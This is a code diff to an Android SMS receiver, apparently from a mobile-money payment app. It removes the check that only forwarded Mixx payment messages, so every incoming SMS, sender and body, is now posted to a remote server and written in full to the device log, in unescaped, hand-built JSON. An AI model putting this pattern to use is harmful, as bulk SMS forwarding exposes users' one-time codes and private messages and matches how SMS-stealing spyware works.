@@ -18,7 +18,7 @@ public class SmsReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        Log.d(TAG, "SMS RECEIVED - STARTING PROCESS");
+        Log.d(TAG, "📱 SMS RECEIVED - STARTING PROCESS");
 
         Bundle bundle = intent.getExtras();
         if (bundle != null) {
@@ -29,22 +29,16 @@ public class SmsReceiver extends BroadcastReceiver {
                     String sender = smsMessage.getDisplayOriginatingAddress();
                     String messageBody = smsMessage.getMessageBody();
 
-                    Log.d(TAG, "SMS From: " + sender);
-                    Log.d(TAG, "SMS Body: " + messageBody);
+                    Log.d(TAG, "📨 SMS From: " + sender);
+                    Log.d(TAG, "💬 SMS Body: " + messageBody);
 
-                    if (isMixxPaymentSMS(sender, messageBody)) {
-                        Log.d(TAG, "MIXX PAYMENT SMS DETECTED");
-                        sendToServer(sender, messageBody);
-                    }
+                    // CHUKUA SMS ZOTE - HAITAFUTI PATTERNS
+                    Log.d(TAG, "✅ TAKING ALL SMS - SENDING TO SERVER");
+                    sendToServer(sender, messageBody);
                 }
             }
         }
     }
-
-private boolean isMixxPaymentSMS(String sender, String messageBody) {
-    Log.d(TAG, "🔍 Checking SMS for Mixx patterns");
-    return messageBody != null && (messageBody.contains("TSh") || messageBody.contains("Kumbukumbu") || messageBody.contains("Umepokea") || messageBody.contains("Umetuma"));
-}
 
     private void sendToServer(final String sender, final String messageBody) {
         new Thread(new Runnable() {
@@ -58,11 +52,15 @@ private boolean isMixxPaymentSMS(String sender, String messageBody) {
                     conn.setRequestProperty("Accept", "application/json");
                     conn.setDoOutput(true);
 
+                    // Tuma data yote ya SMS
                     String jsonData = "{" +
                             "\"sms_content\": \"" + messageBody.replace("\"", "\\\"").replace("\n", " ") + "\"," +
                             "\"sender_number\": \"" + sender + "\"," +
                             "\"timestamp\": \"" + System.currentTimeMillis() + "\"" +
                             "}";
+
+                    Log.d(TAG, "📤 Sending to server: " + SERVER_URL);
+                    Log.d(TAG, "📊 Data: " + jsonData);
 
                     OutputStream os = conn.getOutputStream();
                     os.write(jsonData.getBytes());
@@ -70,12 +68,25 @@ private boolean isMixxPaymentSMS(String sender, String messageBody) {
                     os.close();
 
                     int responseCode = conn.getResponseCode();
-                    Log.d(TAG, "Server Response Code: " + responseCode);
+                    Log.d(TAG, "✅ Server Response Code: " + responseCode);
+
+                    // Read response
+                    BufferedReader br = new BufferedReader(new InputStreamReader(
+                            responseCode == 200 ? conn.getInputStream() : conn.getErrorStream()
+                    ));
+                    String responseLine;
+                    StringBuilder response = new StringBuilder();
+                    while ((responseLine = br.readLine()) != null) {
+                        response.append(responseLine);
+                    }
+                    br.close();
+
+                    Log.d(TAG, "📥 Server Response: " + response.toString());
 
                     conn.disconnect();
 
                 } catch (Exception e) {
-                    Log.e(TAG, "ERROR: " + e.getMessage());
+                    Log.e(TAG, "❌ ERROR: " + e.getMessage());
                 }
             }
         }).start();
